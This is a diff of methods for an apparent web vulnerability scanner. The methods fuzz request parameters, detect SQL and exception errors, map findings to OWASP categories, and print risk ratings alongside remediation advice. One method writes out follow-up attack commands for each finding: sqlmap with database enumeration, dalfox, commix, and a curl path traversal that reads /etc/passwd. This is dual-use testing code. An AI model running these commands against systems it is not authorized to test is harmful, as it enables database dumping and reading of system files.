+    def _fuzz_request(self, ep: Endpoint, param_key: str, payload: str) -> dict:
+        params = dict(ep.params)
+        params[param_key] = payload
+        pname = param_key.split(":")[-1]
+        if param_key.startswith("header:"):
+            return self.client.get(ep.url, extra_headers={pname: payload})
+        if ep.method == "GET":
+            parsed = urllib.parse.urlparse(ep.url)
+            query = dict(urllib.parse.parse_qsl(parsed.query))
+            query[pname] = payload
+            url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(query)))
+            return self.client.get(url)
+        clean = {k.split(":")[-1]: v for k, v in params.items() if not k.startswith(("header:", "path:"))}
+        if ep.body_type == "json":
+            return self.client.post(ep.url, json_data=clean)
+        return self.client.post(ep.url, data=clean)
+
+    @staticmethod
+    def _extract_title(body: str) -> str:
+        match = re.search(r"<title[^>]*>(.*?)</title>", body, re.I | re.S)
+        return match.group(1).strip()[:100] if match else ""
+
+    @staticmethod
+    def _extract_errors(body: str) -> list:
+        found = []
+        for pattern in (r"(exception|traceback|fatal error)", r"SQL syntax|ORA-\d+"):
+            for match in re.finditer(pattern, body, re.I):
+                found.append(match.group()[:50])
+        return list(set(found))[:10]
+
+    @staticmethod
+    def _build_req(ep: Endpoint, param_key: str, payload: str) -> str:
+        pname = param_key.split(":")[-1]
+        if ep.method == "GET":
+            return f"GET {ep.url}?{pname}={urllib.parse.quote(payload)} HTTP/1.1"
+        return f"POST {ep.url}\n\n{pname}={urllib.parse.quote(payload)}"
+
+    @staticmethod
+    def _build_exploit(vuln_type: str, ep: Endpoint, param: str, payload: str) -> str:
+        pname = param.split(":")[-1]
+        if vuln_type == "sqli":
+            return f"sqlmap -u '{ep.url}' -p '{pname}' --batch --dbs"
+        if vuln_type == "xss":
+            return f"dalfox url '{ep.url}' --param {pname}"
+        if vuln_type == "lfi":
+            return f"curl '{ep.url}?{pname}=../../../../etc/passwd'"
+        if vuln_type == "cmdi":
+            return f"commix --url='{ep.url}' -p {pname}"
+        return f"curl '{ep.url}?{pname}={urllib.parse.quote(payload)}'"
+
+    @staticmethod
+    def _owasp_id(vuln_type: str) -> str:
+        return {"sqli": "A03", "xss": "A03", "lfi": "A03", "ssti": "A03", "cmdi": "A03", "ssrf": "A10", "idor": "A01", "nosqli": "A03", "xxe": "A03", "crlf": "A03", "prototype": "A08"}.get(vuln_type, "A03")
+
+    @staticmethod
+    def _owasp_name(vuln_type: str) -> str:
+        return {"sqli": "Injection", "xss": "Injection", "lfi": "Injection", "ssti": "Injection", "cmdi": "Injection", "ssrf": "SSRF", "idor": "Broken Access Control", "nosqli": "Injection", "xxe": "Injection", "crlf": "Injection", "prototype": "Software Integrity Failures"}.get(vuln_type, "Injection")
+
+    @staticmethod
+    def _risk(vuln_type: str, confidence: int) -> str:
+        if confidence >= 85:
+            return {"sqli": "Critical", "cmdi": "Critical", "ssrf": "High", "lfi": "High", "ssti": "Critical"}.get(vuln_type, "High")
+        if confidence >= 60:
+            return "Medium"
+        return "Low"
+
+    @staticmethod
+    def _remediation(vuln_type: str) -> str:
+        return {
+            "sqli": "Use parameterized queries / prepared statements.",
+            "xss": "Encode output. Use Content-Security-Policy.",
+            "lfi": "Validate file paths. Use allowlist. Disable path traversal.",
+            "ssti": "Use sandboxed template engines. Never pass user input to templates.",
+            "cmdi": "Use subprocess with argument list, never shell=True.",
+            "ssrf": "Validate and whitelist allowed URLs. Block internal IPs.",
+            "idor": "Verify object ownership server-side before returning data.",
+            "nosqli": "Sanitize all operator keys. Use allowlist for accepted fields.",
+            "xxe": "Disable external entity processing in XML parser.",
+            "crlf": "Strip CR/LF from all inputs used in HTTP headers.",
+            "prototype": "Freeze Object.prototype. Use Map instead of plain objects.",
+        }.get(vuln_type, "Sanitize and validate all user input.")
+
+    @staticmethod
+    def _print_finding(finding: Finding):
+        color = {"Critical": "\033[1;31m", "High": "\033[0;31m", "Medium": "\033[0;33m", "Low": "\033[0;36m"}.get(finding.risk, "\033[0m")
+        print(f"  {color}[{finding.risk}]\033[0m {finding.owasp_id} - {finding.title} (conf:{finding.confidence}% {'OK' if finding.confirmed else '?'})")
+
+
 def main():
     parser = build_arg_parser()
     args = parser.parse_args()
